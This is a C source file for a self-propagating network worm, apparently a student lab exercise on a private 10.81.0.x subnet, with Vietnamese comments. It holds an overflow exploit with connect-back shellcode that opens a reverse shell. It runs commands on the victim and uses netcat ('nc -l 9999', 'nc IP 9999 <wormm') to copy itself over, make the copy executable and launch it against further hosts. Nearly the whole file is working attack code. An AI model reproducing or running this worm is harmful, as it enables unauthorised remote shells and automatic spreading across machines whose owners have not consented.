#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#define BUF_SIZE 1064

char *targetIP; //IP Victim
int server;
struct sockaddr_in srv;
char buffer[1024];
int conback_port = 4444; //Port mở shell
int hostnum = 0; //Số host trong IP
//standard offset (probably must be modified)
#define RET 0xbffff28b // buffer'address + 7 bytes of "Hello :"

//Shellcode dành cho máy bị tấn công thứ nhất
char shellcode[140] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\xB8\x1B\x40\x11\x17\x35\x11\x11"
        "\x11\x11\x50\x31\xC0\x66\x68\x11"
        "\x5c\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
char shellcodee[140]; //Shellcode dành cho máy bị tấn công thứ n
// Mã Hex tương ứng với số IP thay đổi: 10.81.0.x
char charIPHex[] = 
    {"\x11\x10\x13\x12\x15\x14\x17\x16\x19\x18\x1b\x1a\x1d\x1c\x1f\x1e\x1\x0\x3\x2\x5\x4\x7\x6\x9\x8\xb\xa\xd\xc\xf\xe\x31\x30\x33\x32\x35\x34\x37\x36\x39\x38\x3b\x3a\x3d\x3c\x3f\x3e\x21\x20\x23\x22\x25\x24\x27\x26\x29\x28\x2b\x2a\x2d\x2c\x2f\x2e\x51\x50\x53\x52\x55\x54\x57\x56\x59\x58\x5b\x5a\x5d\x5c\x5f\x5e\x41\x40\x43\x42\x45\x44\x47\x46\x49\x48\x4b\x4a\x4d\x4c\x4f\x4e\x71\x70\x73\x72\x75\x74\x77\x76\x79\x78\x7b\x7a\x7d\x7c\x7f\x7e\x61\x60\x63\x62\x65\x64\x67\x66\x69\x68\x6b\x6a\x6d\x6c\x6f\x6e\x91\x90\x93\x92\x95\x94\x97\x96\x99\x98\x9b\x9a\x9d\x9c\x9f\x9e\x81\x80\x83\x82\x85\x84\x87\x86\x89\x88\x8b\x8a\x8d\x8c\x8f\x8e\xb1\xb0\xb3\xb2\xb5\xb4\xb7\xb6\xb9\xb8\xbb\xba\xbd\xbc\xbf\xbe\xa1\xa0\xa3\xa2\xa5\xa4\xa7\xa6\xa9\xa8\xab\xaa\xad\xac\xaf\xae\xd1\xd0\xd3\xd2\xd5\xd4\xd7\xd6\xd9\xd8\xdb\xda\xdd\xdc\xdf\xde\xc1\xc0\xc3\xc2\xc5\xc4\xc7\xc6\xc9\xc8\xcb\xca\xcd\xcc\xcf\xce\xf1\xf0\xf3\xf2\xf5\xf4\xf7\xf6\xe8\xeb\xea\xed\xec\xef"};

char hostIPc[20];
//Hàm lấy kết quả khi chạy command trên máy chạy chương trình
void getCommandOutput(char *cmd) {
    FILE *fp;
    char path[1035];
    /* Open the command for reading. */
    fp = popen(cmd, "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }
    /* Read the output a line at a time - output it. */
    while (fgets(path, sizeof(path), fp) != NULL) {
        printf("%s", path);
        strcat(hostIPc, path);
    }
    /* close */
    pclose(fp);
}
//Mở port để chờ máy nạn nhân connect vào
void *createListener(){

    printf("\nStart listening on port %d\n", conback_port);
    
    // tạo socket server là máy hiện tại
    server = socket(AF_INET, SOCK_STREAM, 0);
    if (server < 0) {
        fprintf(stderr, "Error: Can't Create Server\n");
        return;
    }

    //state Protocolfamily , then converting the hostname or IP address, and getting  port number
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons(conback_port);
    if (bind(server,(struct sockaddr*) &srv, sizeof(srv)) == -1) {
        perror("Error: Bind");
        return;
    } 
    if (listen(server, 3) == -1) {
        perror("Error: Listen");
        return;
    }
}

int sendPayload(char *targetIP, int targetPort){

    char buf[BUF_SIZE];
    int s, i, size;
    struct sockaddr_in remote;
    struct hostent *host;
    

    /*Create payload*/
    // filling buf with NOPs
    memset(buf, 0x90, BUF_SIZE);
    strcpy(hostIPc, "");
    getCommandOutput("hostname -I");
    if (hostIPc[8] >'0' && hostIPc[8] < '9') {
        hostnum=(hostIPc[8] - '0');
        if (hostIPc[9] >'0' && hostIPc[9] < '9') {
            hostnum=hostnum*10 + (hostIPc[9] - '0');
            if (hostIPc[10] >'0' && hostIPc[10] < '9')
                hostnum=hostnum*10 + (hostIPc[10] - '0');
        }
    }
    //targetIp = 10.81.0.7
    if (targetIP[8] == '7') {
        printf("%s", "First Worm\n");
        //copying shellcode into buf
        memcpy(buf+900-sizeof(shellcode) , shellcode, sizeof(shellcode)-1);
    }
    //targetIp = 10.81.0.x
    else {
        printf("\n%s\n" , "\nNext Worm\n");
        //Tạo shellcode mới dựa trên IP của nạn nhân
        snprintf(shellcodee, sizeof(shellcodee), 
                "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
                "\x06\x51\xb1\x01\x51\xb1\x02\x51"
                "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
                "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
                "\xB8\x1B\x40\x11%c\x35\x11\x11"
                "\x11\x11\x50\x31\xC0\x66\x68\x11"
                "\x5d\xb1\x02\x66\x51\x89\xe7\xb3"
                "\x10\x53\x57\x52\x89\xe1\xb3\x03"
                "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
                "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
                "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
                "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
                "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
                "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
                "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
                "\x2f\x62\x69\x89\xe3\x50\x53\x89"
                "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
                "\x01\xcd\x80",charIPHex[hostnum]);
        //Print để check
        printf("hostnum: %d   %d   \n%s\n%s\n%d\n%d\n", hostnum, conback_port, shellcodee, shellcode, sizeof(shellcodee), sizeof(shellcode));
        memcpy(buf+900-sizeof(shellcodee) , shellcodee, sizeof(shellcodee)-1);
    }
    
    // Copying the return address multiple times at the end of the buf...
    for(i=901; i < BUF_SIZE-4; i+=4) { 
        * ((int *) &buf[i]) = RET;
    }
    buf[BUF_SIZE-1] = 0x0;
    //getting hostname 
    host=gethostbyname(targetIP);
    // creating socket...
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {       
        fprintf(stderr, "Error: Socket\n");
        return 0;
    }
    //state Protocolfamily , then converting the hostname or IP address, and getting  port number
    remote.sin_family = AF_INET;
    remote.sin_addr = *((struct in_addr *)host->h_addr);
    remote.sin_port = htons(targetPort);
    // connecting with destination host
    if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1) {
        close(s);
        fprintf(stderr, "Error: Can't Connect Target To Send Payload\n");
        return 0;
    }
    //sending exploit string
    size = send(s, buf, sizeof(buf), 0);
    if (size==-1) {
        close(s);
        fprintf(stderr, "Error: Sending Data Failed\n");
        return 0;
    }
    // closing socket 
    close(s);
    return 1;
}
//Tìm nạn nhân kế tiếp để lây nhiễm
char *findNextVictim(int x) {
    strcpy(hostIPc, ""); //Clear chuỗi để sử dụng
    getCommandOutput("hostname -I"); //Lấy IP của máy hiện tại
    //Xóa giá trị đằng sau dấu "." cuối cùng trong IP để thành format 10.81.0.x
    int i = strlen(hostIPc)-1; 
    while (hostIPc[i]!='.') {
        memmove(&hostIPc[i], &hostIPc[i + 1], strlen(hostIPc) - i);
        i--;
    } 
    //Thay X vào dựa trên IP mới (Được truyền vào khi gọi hàm)
    char sub[5];
    strcpy(sub,"");
    snprintf (sub, sizeof(sub), "%d",x+1);
    strcat(hostIPc,sub);
    printf("\n%s", hostIPc);
    char *hostIP = hostIPc;
    return hostIP; //Trả về giá trị IP của máy tiếp theo để tấn công.
}
//Thử sử dụng worm trên máy nạn nhân + lan truyền worm sang các máy khác
void *goToNextVictim(){
    int bytes;
    int client, client_size;
    struct sockaddr_in cli;

    //tạo socket client bên phía nạn nhân
    client = accept(server, (struct sockaddr*)&cli, &client_size);
    if (client == -1) {
        perror("Accept() failed");
        return;
    } else printf("Done connect port\n");

    printf("***Get connect back from victim***\n");
    //Chạy 2 câu lệnh: "hostname -I" và "echo Hacked by Bing" trên máy nạn nhân
    //In kết quả ra màn hình
    memcpy(buffer, "hostname -I\x0A",13);
    bytes = send(client, buffer, 13, 0);
    if (bytes == -1) return;
    bytes = recv(client, buffer, sizeof(buffer), 0);
    if (bytes == -1) return;
    buffer[bytes-1] = 0;
    fprintf(stderr, "Excute \"hostname -I\" command: \n%s\n\n", buffer);

    memcpy(buffer, "echo Hacked by Bing\x0A",21);
    bytes = send(client, buffer, 21, 0);
    if (bytes == -1) return;
    bytes = recv(client, buffer, sizeof(buffer), 0);
    if (bytes == -1) return;
    buffer[bytes-1] = 0;
    fprintf(stderr, "Excute \"echo Hacked by Bing\" command: \n%s\n\n", buffer);

    //Lan truyền worm sang máy nạn nhân
    printf("***Go to next victim***\n");
    sleep(5);

    //Mở thêm port 9999 để lan worm sang
    memcpy(buffer, "nc -l 9999 >wormm\x0A",19);
    bytes = send(client, buffer, 19, 0);

    printf("Worm is going to poor victim\n");

    //Gửi worm
    sprintf(buffer, "nc %s 9999 <wormm\x0A", targetIP);
    system(buffer);	
    sleep(3); //Chờ quá trình gửi worm hoàn thành
    
    //Cấp quyền cho file wormm để chạy
    int next = hostnum + 1; 
    memcpy(buffer, "chmod 777 wormm\x0A",17);
    bytes = send(client, buffer, 17, 0);
    
    //Từ máy nạn nhân, scan lần lượt các máy tiếp theo để lan truyền
    while (next < 255) {
        //Tạo câu lệnh lan worm
        char command[] = "./wormm ";
        strcat(command, findNextVictim(next)); //Add nạn nhân kế tiếp vào
        strcat(command,"\x0A");
        memcpy(&buffer, &command ,strlen(command)+1); //Đưa câu lệnh vào buffer để gửi 
        fprintf(stderr,"\nNex Victim: %d\nRun Worm Command: %s\n", next+1, buffer);
        //Gửi buffer để thực hiện lệnh
        bytes = send(client, buffer, sizeof(buffer), 0);
        bytes = recv(client, buffer, sizeof(buffer), 0);
        if (bytes == -1) return;
        buffer[bytes-1] = 0;
        next++; //Chuyển sang máy kế tiếp
        if (next == 10) break; //Ở đây em chỉ chạy đến máy 10 để test cho đỡ mất thời gian
    }
    close(client); //Đóng kết nối với client
}

int main(int argc, char *argv[]) {
    pthread_t thread1, threadd;
    int threatCreate;
    int targetPort = 5000;
    targetIP = argv[1]; //Lấy giá trị IP từ người nhập
    printf("%s",targetIP); //In IP để kiểm tra
    //Nếu không phải nạn nhân đầu tiên thì thay đổi port
    //Vì khi chạy worm đang kết nối với máy chủ bằng port 444 
    //nên không mở port lại lần nữa được
    if (targetIP[8] != '7') conback_port = 4445; 
    printf("\n%d\n", conback_port);
    // First victim 10.81.0.7 
    // Mở conback_port để victim connect vào
    threatCreate = pthread_create( &thread1, NULL, createListener, NULL);
    //Gửi Payload có shellcode
    if (sendPayload(targetIP, targetPort)) {
        printf("Successfully exploited\n\n");
        //Kết nối ngược lại và lan worm
        threatCreate = pthread_create( &threadd, NULL, goToNextVictim, NULL);
        //Tiếp tục chạy main sau khi thực hiện xong threadd
        pthread_join(threadd, NULL);
        printf("\n***Doneeee***\n"); //Thông báo kết nối thành công
    }
    else {
        printf("Exploited fail\n");
    }
    
}
